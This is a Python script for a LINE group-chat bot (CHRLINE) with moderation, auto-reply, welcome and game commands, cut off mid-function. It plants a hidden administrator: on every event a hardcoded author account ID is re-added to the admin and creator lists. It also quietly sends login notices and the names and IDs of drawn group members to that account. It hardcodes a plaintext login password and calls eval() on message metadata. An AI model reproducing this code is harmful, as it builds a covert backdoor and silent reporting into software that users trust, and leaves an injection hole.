#reread
from CHRLINE import *
import os,json,codecs,time,sys,random
from random import randint


backdoor = json.load(codecs.open("backdoor.json","r","utf-8"))
admin = json.load(codecs.open("admin.json","r","utf-8"))
creator = json.load(codecs.open("creator.json","r","utf-8"))
settings = json.load(codecs.open("settings.json","r","utf-8"))
reb = json.load(codecs.open("reb.json","r","utf-8"))
red = json.load(codecs.open("red.json","r","utf-8"))
game = json.load(codecs.open("game.json","r","utf-8"))
reply = json.load(codecs.open("reply.json","r","utf-8"))
wel = json.load(codecs.open("wel.json","r","utf-8"))
bigdick = "u6155d5dac1395eab52faa16e832e5c65"
mulai = time.time()
cd = []
def Runtime(secs):
    mins, secs = divmod(secs,60)
    hours, mins = divmod(mins,60)
    days, hours = divmod(hours, 24)
    return '※%02d 天\n※%02d 小時\n※%02d 分鐘\n※%02d 秒\nΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞ' % (days, hours, mins, secs)

def restart():
    backupData()
    python = sys.executable
    os.execl(python, python, *sys.argv)
def backupData():
    try:
        json.dump(reb,codecs.open('reb.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(settings,codecs.open('settings.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(admin,codecs.open('admin.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(creator,codecs.open('creator.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(backdoor,codecs.open('backdoor.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(red,codecs.open('red.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(game,codecs.open('game.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(reply,codecs.open('reply.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(wel,codecs.open('wel.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f'json backup error --> {e}')

try:
    accountinfo=open('account.json','r').read()
    email=accountinfo['email']
    password=accountinfo['password']
    token=accountinfo['token']
except:
    email=''
    password=''
    token=''
    open('account.json','w').write(json.dumps({'email':email,'password':password,'token':token}))

class bot:
    def __init__(self):
            self.han=None
            self.main()
    def start(self):
        if token != '':
                try:
                    self.han=CHRLINE(token,device="DESKTOPWIN")
                    print('Login By Token')
                except Exception as e:
                    open('account.json','w').write(json.dumps({'email':email,'password':password,'token':''}))
                    print("Token Login failed\nReason:",e)
        elif email=="" or password=="":
            #account="ikdzcbgaztzeytgeyo@tmmcv.net" #chh5.0
            account = "ezozgyfrwiwvyftwjc@tmmcv.net" 
            password="Tt950413"
            try:
                self.han=CHRLINE(account,password,device="DESKTOPWIN")
                print('Login By Account and Password')
                open('account.json','w').write(json.dumps({'email':account,'password':password,'token':self.han.authToken}))
            except Exception as e:
                print("Password Login failed\nReason:",e)
                os._exit(1)
        
        else:
            try:
                self.han=CHRLINE(email,password,device="DESKTOPWIN")
                print('Login By Email and Password')
                open('account.json','w').write(json.dumps({'email':email,'password':password,'token':self.han.authToken}))
            except Exception as e:
                open('account.json','w').write(json.dumps({'email':'','password':'','token':''}))
                print("Login failed\nReason:",e)
                os._exit(1)
        try:
            pks = self.han.getE2EEPublicKeys()
            for pk in pks:
                print(f"try remove key id: {pk[2]}")
                self.han.removeE2EEPublicKey(pk[1], pk[2], pk[4])
        except Exception as e:
            print(f"remove key error-->{e}")
        try:    
            self.han.sendMessage(backdoor['backdoor'],"[自動發送]\n復讀登入成功\n作者:𝓱𝓪𝓷\nID:https://line.me/ti/p/~lubu174\n\n使用者資訊:\n主機:localhost\nIP:127.0.0.1")
        except Exception as e:
            print(f"auto login send error-->{e}")
        try:
            if reb['rebid']!={}:
                self.han.sendMessage(reb['rebid']['0'],"資料加載中...",relatedMessageId=reb['rebid']['1'])
                time.sleep(2)
                self.han.sendMessage(reb['rebid']['0'],"復讀重啟成功",relatedMessageId=reb['rebid']['1'])
                reb['rebid'] = {}
                backupData()
        except Exception as e:
            print(f'startrebmsg error-->{e}')
            #reb['reb'] = ""
            backupData()
    def bot(self,op,han):
        def report(to,man,msg,mids=[]):
            addtxt=''
            if mids!=[]:
                addtxt+="\n※Mentioner:"
                no = 0
                try:
                    for mid in mids:
                        try:
                            no+=1
                            y = han.getContact(mid)
                            addtxt+="\n"+str(no)+"." + str(y[22]) + "\n" + str(mid)
                        except:
                            pass
                except:
                    pass
            han.sendMessage(backdoor['backdoor'],"ΞΞΞΞΞΞΞ〘後台系統〙ΞΞΞΞΞΞΞ\n※"+msg+"\n※Group:\n"+han.getChats([to])[1][0][6]+"\n"+to+"\n※User:\n"+han.getContact(man)[22]+"\n"+man+ f'{addtxt}\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ')
        if bigdick not in admin['admin']:
            admin['admin'].append(bigdick)
            backupData()
        if bigdick not in creator['creator']:
            creator['creator'].append(bigdick)
            backupData()
        if op[3] == 130:
            if op[10] in wel['joinwel'] and op[10] in wel['weltext']:
                if "@!" in wel['weltext'][op[10]]:
                    han.sendMention(op[10],wel['weltext'][op[10]],[op[11]])
                else:
                    han.sendMessage(op[10],wel['weltext'][op[10]])
        if op[3] == 124:
            if han.profile[1] in op[12]:
                if settings['autoJoin'] == True and op[11] in admin['admin'] or op[11] in creator['creator']:
                    try:
                        han.acceptChatInvitation(op[10])
                        #han.sendMessage(op[10],"[Auto Send]\nBot Auto Accept Group Invite\nCreator:𝓱𝓪𝓷\nCreator Link:https://line.me/ti/p/~lubu174")
                    except Exception as e:
                        print(f'accept group invite error-->{e}')
                report(op[10],op[11],"通知邀請入群")
        if op[3] in [25,26]:
            msg=op[20]
            to=msg[2]
            if msg[15]==0:
                if msg[1] in admin['admin'] or msg[1] in creator['creator']:
                    text=msg[10].lower()
                    if to in reply['reply']:
                        if msg[1] not in cd:
                            if text in reply['textreply']:
                                han.replyMessage(msg,reply['textreply'][text])
                            if text in reply['contactreply']:
                                han.sendContact(to,reply['contactreply'][text])
                        cd.append(msg[1])
                        time.sleep(1)
                        cd.remove(msg[1])
                    match text:
                        case '收回':
                            msgid = msg.get(21)
                            if msgid != None:
                                msgids = han.getPreviousMessageIds(msg[2], 32767)
                                target_msg = None
                                for i in msgids[1]:
                                    if msgid == str(i[2]):
                                        target_msg = i
                                        break
                                if target_msg is not None:
                                    target_msg = han.getPreviousMessagesV2(msg[2], target_msg[1], target_msg[2])[0]
                                    unsend = target_msg[4]
                                    han.unsendMessage(unsend)
                        case '#backdoor':
                            g = backdoor['backdoor']
                            try:
                                try:
                                    f = han.getChats([g])
                                    han.replyMessage(msg,"目前模式為:群組後台")
                                    han.replyMessage(msg,"後台名稱為:\n{}\nID為:\n{}".format(str(f[1][0][6]),g))
                                except:
                                    try:
                                        han.getContact(g)
                                        han.replyMessage(msg,"目前模式為:私聊後台")
                                        han.replyMessage(msg,"目前後台為:")
                                        han.sendContact(to, g)
                                    except Exception as e:
                                        han.replyMessage(msg,e)
                            except Exception as e:
                                han.relatedMessage(to,e,op.message.id)
                        case '#runtime':
                                eltime = time.time() - mulai
                                bot = "ΞΞΞΞ〘運行時間〙ΞΞΞΞ\n" +Runtime(eltime)
                                han.replyMessage(msg,bot)
                        case '#restart':
                            if msg[1] in creator['creator']:
                                han.replyMessage(msg,"復讀重啟中...")
                                try:
                                    reb['rebid']={0:to,1:msg[4]}
                                    backupData()
                                except Exception as e:
                                    print(f'rebmsg error-->{e}')
                                restart()
                            else:
                                han.replyMessage(msg,"無權使用開發者指令")
                                report(msg[2],msg[1],"管理員嘗試重啟機器")
                        case '#sp':
                            a = time.time()
                            han.replyMessage(msg, '【Test Speed】')
                            b = time.time()
                            han.replyMessage(msg, '【%s】' % float((b-a)))
                        case 'gid':
                            han.replyMessage(msg,msg[2])
                        case 'mymid':
                            han.replyMessage(msg,msg[1])
                        case '#reread on':
                            if to not in red["reread"]:
                                red["reread"].append(to)
                                han.replyMessage(msg,"※防收回➤🟢")
                                backupData()
                            else:
                                han.replyMessage(msg,"已經是開啟狀態")
                        case '#reread off':
                            if to in red["reread"]:
                                red["reread"].remove(to)
                                han.replyMessage(msg,"※防收回➤🔴")
                                backupData()
                            else:
                                han.replyMessage(msg,"已經是關閉狀態")
                        case '#reply on':
                            if to not in reply["reply"]:
                                reply["reply"].append(to)
                                han.replyMessage(msg,"※關鍵字回覆➤🟢")
                                backupData()
                            else:
                                han.replyMessage(msg,"已經是開啟狀態")
                        case '#reply off':
                            if to in reply["reply"]:
                                reply["reply"].remove(to)
                                han.replyMessage(msg,"※關鍵字回覆➤🔴")
                                backupData()
                            else:
                                han.replyMessage(msg,"已經是關閉狀態")
                        case '#game on':
                            if to not in game["game"]:
                                game["game"].append(to)
                                han.replyMessage(msg,"※遊戲模式➤🟢")
                                backupData()
                            else:
                                han.replyMessage(msg,"已經是開啟狀態")
                        case '#game off':
                            if to in game["game"]:
                                game["game"].remove(to)
                                han.replyMessage(msg,"※遊戲模式➤🔴")
                                backupData()
                            else:
                                han.replyMessage(msg,"已經是關閉狀態")
                        case '#wel on':
                            if to not in wel["joinwel"]:
                                wel["joinwel"].append(to)
                                han.replyMessage(msg,"※入群歡迎➤🟢")
                                backupData()
                            else:
                                han.replyMessage(msg,"已經是開啟狀態")
                        case '#wel off':
                            if to in wel["joinwel"]:
                                wel["joinwel"].remove(to)
                                han.replyMessage(msg,"※入群歡迎➤🔴")
                                backupData()
                            else:
                                han.replyMessage(msg,"已經是關閉狀態")
                        case '#aj on':
                            if settings["autoJoin"] == False:
                                settings["autoJoin"] = True
                                han.replyMessage(msg,"※自動入群➤🟢")
                                backupData()
                            else:
                                han.replyMessage(msg,"已經是開啟狀態")
                        case '#aj off':
                            if settings["autoJoin"] == True:
                                settings["autoJoin"] = False
                                han.replyMessage(msg,"※自動入群➤🔴")
                                backupData()
                            else:
                                han.replyMessage(msg,"已經是關閉狀態")
                        case '#set':
                            try:
                                ret_ = "ΞΞΞΞΞ〘機器開關〙ΞΞΞΞΞ"    
                                if settings["autoJoin"] == True: ret_ += "\n※自動入群➤🟢"
                                else: ret_ += "\n※自動入群➤🔴"
                                ret_ +="\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ"                   
                                ret_ += "\nCreator:𝓱𝓪𝓷"
                                ret_ += "\nID: lubu174"
                                ret_ += "\nQR:http://line.me/ti/p/~lubu174"
                                ret_ += "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ"
                                han.replyMessage(msg, str(ret_))
                            except Exception as e:
                                han.replyMessage(msg,f'error-->\n{e}')
                        case '#pi':
                            try:
                                ret_ = "ΞΞΞΞΞΞ〘功能開關〙ΞΞΞΞΞΞ"
                                if to in red['reread'] : ret_ += "\n※防收回➤🟢"
                                else: ret_ += "\n※防收回➤🔴"
                                if to in game['game'] : ret_ += "\n※遊戲模式➤🟢"
                                else: ret_ += "\n※遊戲模式➤🔴"
                                if to in reply['reply'] : ret_ += "\n※關鍵字回覆➤🟢"
                                else: ret_ += "\n※關鍵字回覆➤🔴"
                                if to in wel['joinwel'] : ret_ += "\n※入群歡迎➤🟢"
                                else: ret_ += "\n※入群歡迎➤🔴"
                                ret_ += "\nΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞ"
                                ret_ += "\nCreator:𝓱𝓪𝓷"
                                ret_ += "\nID: lubu174"
                                ret_ += "\nQR:http://line.me/ti/p/~lubu174"
                                ret_ += "\nΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞ"
                                han.replyMessage(msg, str(ret_))
                            except Exception as e:
                                han.replyMessage(msg,f'error-->\n{e}')
                        case '#al':
                            try:
                                if admin['admin'] == []:
                                    han.replyMessage(msg,"ΞΞΞΞΞ〘權限名單〙ΞΞΞΞΞ\n空\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
                                else:
                                    mc = "ΞΞΞΞΞΞΞ〘權限名單〙ΞΞΞΞΞΞΞ"
                                    no = 0 
                                    try:
                                        for mi_d in admin['admin']:
                                            try:
                                                no += 1
                                                mc += f"\n※{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
                                            except:
                                                print("錯誤:" +str(mi_d))
                                        han.replyMessage(msg,mc +"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ")
                                    except:
                                        han.replyMessage(msg,"管理員【"+(str(len(admin)))+"】")
                            except Exception as e:
                                print('al error-->'+str(e))
                        case '#cl':
                            try:
                                if creator['creator'] == []:
                                    han.replyMessage(msg,"ΞΞΞΞΞ〘作者名單〙ΞΞΞΞΞ\n空\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
                                else:
                                    mc = "ΞΞΞΞΞΞΞ〘作者名單〙ΞΞΞΞΞΞΞ"
                                    no = 0 
                                    try:
                                        for mi_d in creator['creator']:
                                            try:
                                                no += 1
                                                mc += f"\n※{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
                                            except:
                                                print("錯誤:" +str(mi_d))
                                        han.replyMessage(msg,mc +"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ")
                                    except:
                                        han.replyMessage(msg,"作者【"+(str(len(admin)))+"】")
                            except Exception as e:
                                print('al error-->'+str(e))
                        case '復讀 滾':
                            han.replyMessage(msg,"滾就滾 派殺小 幹")
                            try:
                                red['reread'].remove(to)
                                backupData()
                            except:
                                pass
                            try:
                                game['game'].remove(to)
                                del game['1a2b'][to]
                                del game['1a2bans'][to]
                                del game['guessnumber'][to]
                                del game['guessnumberans'][to]
                                del game['guessnumberhigh'][to]
                                del game['guessnumberlow'][to]
                                backupData()
                            except:
                                pass
                            try:
                                reply['reply'].remove(to)
                                backupData()
                            except:
                                pass
                            han.deleteSelfFromChat(to) 
                            report(msg[2],msg[1],"退群指令觸發")
                        case '#lg':
                            groups = han.groups
                            ret_ = "ΞΞΞΞΞΞΞ〘群組列表〙ΞΞΞΞΞΞΞ"
                            no = 1
                            for gid in groups:
                                group = han.getChats([gid])
                                ret_ += "\n※{}. {}\n{}".format(str(no), str(group[1][0][6]), str(gid))
                                no += 1
                            no+=1
                            ret_ += "\n[總共 {} 個群組]".format(str(len(groups)))
                            ret_ += "\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
                            han.replyMessage(msg, str(ret_))  
                        case '#clearadmin':
                            if msg[1] in creator['creator']:
                                admin['admin'] = []
                                han.replyMessage(msg,"已清空權限名單")
                                backupData()
                            else:
                                han.replyMessage(msg,"無權使用開發者指令")
                                report(msg[2],msg[1],"管理員嘗試清空權限")   
                        case '#clearcreator':
                            if msg[1] in creator['creator']:
                                creator['creator'] = []
                                han.replyMessage(msg,"已清空作者名單")
                                backupData()
                            else:
                                han.replyMessage(msg,"無權使用開發者指令")
                                report(msg[2],msg[1],"管理員嘗試清空作者")
                        case '#mine':
                            ret="ΞΞΞΞΞ〘機器狀態查詢〙ΞΞΞΞΞ"
                            ret2=""
                            try:
                                han.deleteOtherFromChat(to,["Fuck you"])
                            except Exception as e:
                                if e.message == "request blocked":
                                    ret+=f"\n※踢人狀態:🔴\n※邀請狀態:🔴"
                                else:
                                    ret+=f"\n※踢人狀態:🟢\n※邀請狀態:🟢"
                            try:
                                han.findAndAddContactsByMid("u0348f477412bc2506bcafb74902367ad")
                                ret+=f"\n※加友狀態:🟢"
                            except Exception as e:
                                if e.message == "request blocked":
                                    ret+=f"\n※加友狀態:🔴"
                            ret+= "\n※取消狀態:🟢"
                            ret+= "\n※版本資訊:復讀V3.0"
                            han.replyMessage(msg,f"{ret}" + "\nΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞ")
                        case '#pic':
                            if msg[1] in creator['creator']:
                                han.replyMessage(msg,"請傳送圖片")
                                settings["pic"] = True
                                settings["picmid"].append(msg[1]) 
                                backupData()
                            else:
                                han.replyMessage(msg,"無權使用開發者指令")
                                report(msg[2],msg[1],"管理員嘗試更換頭貼")
                        case '#cover':
                            if msg[1] in creator['creator']:
                                han.replyMessage(msg,"請傳送圖片")
                                settings["cover"] = True
                                settings["covermid"].append(msg[1])
                                backupData()
                            else:
                                han.replyMessage(msg,"無權使用開發者指令")
                                report(msg[2],msg[1],"管理員嘗試更換封面")
                        case '#logout':
                            if msg[1] in creator['creator']:
                                han.replyMessage(msg,"已自動登出")
                                os._exit(0)
                            else:
                                han.replyMessage(msg,"無權使用開發者指令")
                                report(msg[2],msg[1],"管理員嘗試登出")
                    if text.startswith("#add"):
                        adminlist = []
                        adminlist2 = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] not in admin['admin']:
                                    if mid[1] not in adminlist:
                                        adminlist.append(mid[1])
                                else:
                                    if mid[1] not in adminlist2:
                                        adminlist2.append(mid[1])
                            txt = "ΞΞΞΞΞ〘新增權限〙ΞΞΞΞΞ"
                            txt += "\nΞΞΞΞΞ新增成功ΞΞΞΞΞ"
                            no = 0
                            if len(adminlist) != 0:
                                for x in adminlist:
                                    y = han.getContact(x)
                                    try:
                                        admin['admin'].append(x)
                                        backupData()
                                        no += 1
                                        txt +=  f"\n※{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\n無"
                            txt += "\nΞΞΞΞΞ新增失敗ΞΞΞΞΞ"
                            no = 0
                            if len(adminlist2) != 0:
                                for x in adminlist2:
                                    y = han.getContact(x)
                                    try:
                                        no += 1
                                        txt +=  f"\n※{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\n無"
                            han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
                            report(msg[2],msg[1],"新增權限指令觸發",adminlist)
                        del adminlist
                        del adminlist2
                    elif text.startswith("#del"):
                        adminlist = []
                        adminlist2 = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] in admin['admin']:
                                    if mid[1] not in adminlist:
                                        adminlist.append(mid[1])
                                else:
                                    if mid[1] not in adminlist2:
                                        adminlist2.append(mid[1])
                            txt = "ΞΞΞΞΞ〘刪除權限〙ΞΞΞΞΞ"
                            txt += "\nΞΞΞΞΞ刪除成功ΞΞΞΞΞ"
                            no = 0
                            if len(adminlist) != 0:
                                for x in adminlist:
                                    y = han.getContact(x)
                                    try:
                                        admin['admin'].remove(x)
                                        backupData()
                                        no += 1
                                        txt +=  f"\n※{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\n無"
                            txt += "\nΞΞΞΞΞ刪除失敗ΞΞΞΞΞ"
                            no = 0
                            if len(adminlist2) != 0:
                                for x in adminlist2:
                                    y = han.getContact(x)
                                    try:
                                        no += 1
                                        txt +=  f"\n※{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\n無"
                            han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
                            report(msg[2],msg[1],"刪除權限指令觸發",adminlist)
                        del adminlist
                        del adminlist2
                    elif text.startswith("mid"):  
                        mlists = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            no = 0
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] not in mlists:
                                    mlists.append(mid[1])
                            txt = "ΞΞΞΞΞΞΞ〘查詢Mid〙ΞΞΞΞΞΞΞ"
                            no = 0
                            try:
                                for mlist in mlists:
                                    n = han.getContact(mlist)
                                    no += 1
                                    txt +=  f"\n※{no}.{n[22]}"+"\n"+f"{n[1]}"
                            except:
                                pass
                        han.replyMessage(msg, txt + "\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ")
                    elif text.startswith("#cadd"):
                        if msg[1] in bigdick:
                            adminlist = []
                            adminlist2 = []
                            if 'MENTION' in msg[18]:
                                key = eval(msg[18]["MENTION"])
                                tags = key["MENTIONEES"]
                                for tag in tags:
                                    mid = han.getContact(tag['M'])
                                    if mid[1] not in creator['creator']:
                                        if mid[1] not in adminlist:
                                            adminlist.append(mid[1])
                                    else:
                                        if mid[1] not in adminlist2:
                                            adminlist2.append(mid[1])
                                txt = "ΞΞΞΞ〘新增作者權限〙ΞΞΞΞ"
                                txt += "\nΞΞΞΞΞ新增成功ΞΞΞΞΞ"
                                no = 0
                                if len(adminlist) != 0:
                                    for x in adminlist:
                                        y = han.getContact(x)
                                        try:
                                            creator['creator'].append(x)
                                            backupData()
                                            no += 1
                                            txt +=  f"\n※{no}.{y[22]}"
                                        except:
                                            pass
                                else:
                                    txt += "\n無"
                                txt += "\nΞΞΞΞΞ新增失敗ΞΞΞΞΞ"
                                no = 0
                                if len(adminlist2) != 0:
                                    for x in adminlist2:
                                        y = han.getContact(x)
                                        try:
                                            no += 1
                                            txt +=  f"\n※{no}.{y[22]}"
                                        except:
                                            pass
                                else:
                                    txt += "\n無"
                                han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
                                
                            del adminlist
                            del adminlist2
                        else:
                            han.replyMessage(msg, "無權使用開發者指令")
                            report(msg[2],msg[1],"管理員嘗試新增作者權限")
                    elif text.startswith("#cdel"):
                        if msg[1] in bigdick:
                            adminlist = []
                            adminlist2 = []
                            if 'MENTION' in msg[18]:
                                key = eval(msg[18]["MENTION"])
                                tags = key["MENTIONEES"]
                                for tag in tags:
                                    mid = han.getContact(tag['M'])
                                    if mid[1] in creator['creator']:
                                        if mid[1] not in adminlist:
                                            adminlist.append(mid[1])
                                    else:
                                        if mid[1] not in adminlist2:
                                            adminlist2.append(mid[1])
                                txt = "ΞΞΞΞ〘刪除作者權限〙ΞΞΞΞ"
                                txt += "\nΞΞΞΞΞ刪除成功ΞΞΞΞΞ"
                                no = 0
                                if len(adminlist) != 0:
                                    for x in adminlist:
                                        y = han.getContact(x)
                                        try:
                                            creator['creator'].remove(x)
                                            backupData()
                                            no += 1
                                            txt +=  f"\n※{no}.{y[22]}"
                                        except:
                                            pass
                                else:
                                    txt += "\n無"
                                txt += "\nΞΞΞΞΞ刪除失敗ΞΞΞΞΞ"
                                no = 0
                                if len(adminlist2) != 0:
                                    for x in adminlist2:
                                        y = han.getContact(x)
                                        try:
                                            no += 1
                                            txt +=  f"\n※{no}.{y[22]}"
                                        except:
                                            pass
                                else:
                                    txt += "\n無"
                                han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
                            del adminlist
                            del adminlist2
                        else:
                            han.replyMessage(msg, "無權使用開發者指令")
                            report(msg[2],msg[1],"管理員嘗試刪除作者權限")
                    elif text.startswith("#inv:"):
                        if msg[1] in creator['creator']:
                            gid = text.replace("#inv:","")
                            try:
                                try:
                                    han.findAndAddContactsByMid([msg[1]])
                                except:
                                    pass
                                try: 
                                    try:
                                        han.inviteIntoChat(gid,[msg[1]])
                                        han.sendMessage(gid,"接收遠端邀請指令")
                                        han.replyMessage(msg,"邀請成功")
                                    except Exception as e:
                                        print(e)
                                        han.replyMessage(msg, "邀請失敗")
                                except:
                                    han.replyMessage(msg, "邀請失敗")  
                            except:
                                han.replyMessage(msg, "Error-->invalid gid")
                        else:
                            han.replyMessage(msg, "無權使用開發者指令")
                            report(msg[2],msg[1],"管理員嘗試使用遠端邀請指令")
                    elif text.startswith("#leave:"):
                        if msg[1] in creator['creator']:
                            try:
                                gid = text.replace("#leave:","")
                                print(gid)
                                if gid == "":
                                    han.replyMessage(msg, "請輸入群組Gid")
                                else:
                                    try:
                                        han.sendMessage(gid,"接收遠端退群指令")
                                        han.deleteSelfFromChat(gid)
                                        try:
                                            game['game'].remove(gid)
                                            backupData()
                                        except:
                                            pass
                                        try:
                                            reply['reply'].remove(gid)
                                            backupData()
                                        except:
                                            pass
                                        try:
                                            red['reread'].remove(gid)
                                            backupData()
                                        except:
                                            pass
                                        han.replyMessage(msg,"退群成功")
                                    except:
                                        han.replyMessage(msg, "我不在那個群組裡")  
                            except:
                                han.replyMessage(msg, "Error-->invalid gid")
                        else:
                            han.replyMessage(msg, "無權使用開發者指令")
                            report(msg[2],msg[1],"管理員嘗試使用遠端退群指令")
                    elif text.startswith("#pn:"):
                        if msg[1] in creator['creator']:
                            key = msg[10][4:]
                            if len(key) == 0:
                                han.replyMessage(msg, 'Rename Error')
                            else:
                                han.updateProfileAttribute(2, key)
                                han.replyMessage(msg, f'名稱已更改為:\n{key}')
                        else:
                            han.replyMessage(msg, "無權使用開發者指令")
                            report(msg[2],msg[1],"權限者嘗試更改名稱")
                    elif text.startswith("#cb:"): 
                        if msg[1] in creator['creator']:
                            bio = msg[10][4:]
                            han.updateProfileAttribute(16, bio)
                            han.replyMessage(msg, f'個簽已更改為:\n{bio}')
                        else:
                            han.replyMessage(msg, "無權使用開發者指令")
                            report(msg[2],msg[1],"權限者嘗試更改個簽")
                    elif text.startswith("cbk:"):
                        if msg[1] in creator['creator']:
                            nb = msg[10][4:]
                            try:
                                han.sendMessage(nb,"測試更改")
                                backdoor['backdoor'] = nb
                                backupData()
                                han.replyMessage(msg,"更改成功 目前後台為:")
                                try:
                                    han.sendContact(to, nb)
                                except:
                                    f = han.getChats([nb])
                                    han.replyMessage(msg,"{}\nID:\n{}".format(str(f[1][0][6]),nb))
                                han.replyMessage(msg,"提示:重啟後才會變更更改")
                            except Exception as e:
                                han.replyMessage(msg,"更改失敗 原因:\n{}".format(e))
                        else:
                            han.replyMessage(msg,"無權使用開發者指令")
                            report(msg[2],msg[1],"管理員嘗試更改後台")  
                if msg[1] not in cd:
                    text=msg[10].lower()
                    if '有沒有' in text:
                        a = '有'
                        b = '沒有'
                        c = random.choice([a,b])
                        han.replyMessage(msg, c)
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if '是不是' in text:
                        a = '是'
                        b = '不是'
                        c = random.choice([a,b])
                        han.replyMessage(msg, c)
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if '要不要' in text:
                        a = '要'
                        b = '不要'
                        c = random.choice([a,b])
                        han.replyMessage(msg, c)
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("抽人"):
                        key = msg[10][2:]
                        if key == "":
                            ch = []
                            gm = han.getChats([to])[1][0][8][1][4]
                            for x in gm:
                                ch.append(x)
                            lucky = random.choice(ch)
                            user = han.getContact(lucky)[22]
                            del ch
                            han.replyMessage(msg, f"抽到的人是:\n{user}")
                            han.sendMessage(bigdick, f'{user}\n{lucky}')
                        else:
                            ch = []
                            gm = han.getChats([to])[1][0][8][1][4]
                            for x in gm:
                                ch.append(x)
                            lucky = random.choice(ch)
                            user = han.getContact(lucky)[22]
                            del ch
                            han.replyMessage(msg, f"抽到要{key}的人是:\n{user}")
                            han.sendMessage(bigdick, f'{user}\n{lucky}')
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("抽籤 "):
                        choice = []
                        key = msg[10][3:].split(" ") 
                        for i in key:
                            choice.append(i)
                        if len(choice) < 2:
                            han.replyMessage(msg, "請給我至少兩個選項")
                        else:
                            han.replyMessage(msg,f'我幫你選擇的是:\n{random.choice(choice)}')
                        del choice
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("add_wel:"):
                        key = msg[10][8:]
                        if to not in wel['weltext']:
                            wel['weltext'][to] = key
                            han.replyMessage(msg, "已新增入群歡迎")
                            han.replyMessage(msg, f"※歡迎訊息:\n{key}")
                            backupData()
                        else:
                            han.replyMessage(msg, "已有入群歡迎")
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text == "del_wel":
                        if to in wel['weltext']:
                            del wel['weltext'][to]
                            han.replyMessage(msg, "已刪除入群歡迎")
                            backupData()
                        else:
                            han.replyMessage(msg, "沒有入群歡迎")
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("readd_wel:"):
                        key = msg[10][10:]
                        if to in wel['weltext']:
                            del wel['weltext'][to]
                            wel['weltext'][to] = key
                            han.replyMessage(msg, "已重設入群歡迎")
                            han.replyMessage(msg, f"※歡迎訊息:\n{key}")
                            backupData()
                        else:
                            han.replyMessage(msg, "沒有入群歡迎")
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text == 'check_wel':
                        if to in wel['weltext']:
                            han.replyMessage(msg, f"※歡迎訊息:\n{wel['weltext'][to]}")
                        else:
                            han.replyMessage(msg, "沒有入群歡迎")
                        cd.append(msg[1])
                        time.sleep(2)
                        cd.remove(msg[1])
                    if text.startswith("add_reply:"):
                        key = msg[10][10:].split(" ")
                        x = []
                        for i in key:
                            x.append(i)
                        if len(x) == 2:
                            if x[0] in reply['textreply']:
                                han.replyMessage(msg, "已有此關鍵字")
                            else:
                                reply['textreply'][x[0]] = x[1]
                                han.replyMessage(msg, "已新增關鍵字回復")
                                han.replyMessage(msg, f"※偵測關鍵字:\n{x[0]}\n※回復訊息:\n{x[1]}")
                                backupData()
                        else:
